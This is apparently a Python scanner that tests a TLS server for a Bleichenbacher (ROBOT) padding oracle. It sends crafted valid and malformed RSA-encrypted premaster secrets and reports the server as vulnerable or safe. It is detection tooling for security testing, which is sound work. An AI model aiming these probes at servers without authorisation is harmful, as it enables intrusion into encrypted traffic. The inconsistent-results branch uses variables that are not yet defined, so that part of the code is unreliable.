#!/usr/bin/env python3

# standard modules
import math
import time
import sys
import socket
import os
import argparse
import ssl
import gmpy2
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True


def get_rsa_from_server(server, port):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        return cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e
    except ssl.SSLError as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
        if args.csv:
            # TODO: We could add an extra check that the server speaks TLS without RSA
            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
        quit()
    except ConnectionRefusedError as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
        if args.csv:
            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
        quit()


def oracle(pms, messageflow=False):
    global cke_version
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((ip, args.port))
            s.sendall(ch)
        else:
            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
        s.settimeout(timeout)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if (psize == 2):
                return ("The server sends an Alert after ClientHello")
            # try to read further record data
            while i + psize + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                break
            i += psize + 5
        cke_version = buf[9:11]
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            if len(alert) == 0:
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        # exc_type, exc_obj, exc_tb = sys.exc_info()
        # print("line %i", exc_tb.tb_lineno)
        # print ("Exception received: " + str(e))
        return str(e)


parser = argparse.ArgumentParser(description="Bleichenbacher attack")
parser.add_argument("host", help="Target host")
parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
parser.add_argument("-t", "--timeout", default=5, help="Timeout")
parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
groupcipher = parser.add_mutually_exclusive_group()
groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
parser.add_argument("--csv", help="Output CSV format", action="store_true")
args = parser.parse_args()

args.port = int(args.port)
timeout = float(args.timeout)

if args.gcm:
    ch = ch_gcm
elif args.cbc:
    ch = ch_cbc
else:
    ch = ch_def

# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

try:
    ip = socket.gethostbyname(args.host)
except socket.gaierror as e:
    if not args.quiet:
        print("Cannot resolve host: %s" % e)
    if args.csv:
        print("NODNS,%s,,,,,,,,," % (args.host))

    quit()


if not args.quiet:
    print("Scanning host %s ip %s port %i" % (args.host, ip, args.port))

N, e = get_rsa_from_server(ip, args.port)
modulus_bits = int(math.ceil(math.log(N, 2)))
modulus_bytes = (modulus_bits + 7) // 8
if not args.quiet:
    print("RSA N: %s" % hex(N))
    print("RSA e: %s" % hex(e))
    print ("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))

cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
# pad_len is length in hex chars, so bytelen * 2
pad_len = (modulus_bytes - 48 - 3) * 2
rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# wrong first two bytes
pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# 0x00 on a wrong position, also trigger older JSSE bug
pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
# no 0x00 in the middle
pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
# wrong version number (according to Klima / Pokorny / Rosa paper)
pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")


oracle_good = oracle(pms_good, messageflow=False)
oracle_bad1 = oracle(pms_bad1, messageflow=False)
oracle_bad2 = oracle(pms_bad2, messageflow=False)
oracle_bad3 = oracle(pms_bad3, messageflow=False)
oracle_bad4 = oracle(pms_bad4, messageflow=False)

if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
    if not args.quiet:
        print("Identical results (%s), retrying with changed messageflow" % oracle_good)
    oracle_good = oracle(pms_good, messageflow=True)
    oracle_bad1 = oracle(pms_bad1, messageflow=True)
    oracle_bad2 = oracle(pms_bad2, messageflow=True)
    oracle_bad3 = oracle(pms_bad3, messageflow=True)
    oracle_bad4 = oracle(pms_bad4, messageflow=True)
    if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
        if not args.quiet:
            print("Identical results (%s), no working oracle found" % oracle_good)
            print("NOT VULNERABLE!")
        if args.csv:
            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
        sys.exit(1)
    else:
        flow = True
else:
    flow = False

# Re-checking all oracles to avoid unreliable results
oracle_good_verify = oracle(pms_good, messageflow=flow)
oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)

if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
    if not args.quiet:
        print("Getting inconsistent results, aborting.")
    if args.csv:
        print("INCONSISTENT,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
    quit()

# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
# requests starting with 0002, we have a weak oracle. This is because the only
# case where we can distinguish valid from invalid requests is when we send
# correctly formatted PKCS#1 message with 0x00 on a correct position. This
# makes our oracle weak
if (oracle_bad1 == oracle_bad2 == oracle_bad3):
    oracle_strength = "weak"
    if not args.quiet:
        print ("The oracle is weak, the attack would take too long")
else:
    oracle_strength = "strong"
    if not args.quiet:
        print("The oracle is strong, real attack is possible")

if flow:
    flowt = "shortened"
else:
    flowt = "standard"

if cke_version[0] == 3 and cke_version[1] == 0:
    tlsver = "SSLv3"
elif cke_version[0] == 3 and cke_version[1] == 1:
    tlsver = "TLSv1.0"
elif cke_version[0] == 3 and cke_version[1] == 2:
    tlsver = "TLSv1.1"
elif cke_version[0] == 3 and cke_version[1] == 3:
    tlsver = "TLSv1.2"
else:
    tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

if args.csv:
    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
else:
    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))

if not args.quiet:
    print("Result of good request:                        %s" % oracle_good)
    print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
    print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
    print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
    print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)
